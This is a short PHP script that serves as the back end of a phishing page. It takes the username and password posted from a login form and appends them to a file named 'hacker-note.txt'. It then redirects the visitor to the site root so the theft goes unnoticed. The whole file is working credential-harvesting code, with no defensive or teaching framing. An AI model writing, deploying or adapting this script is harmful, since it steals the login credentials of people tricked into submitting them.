<?php
  $file = fopen('hacker-note.txt', 'a');
  fwrite($file, "$_POST[username] | $_POST[password]\n");

  header('Location: /');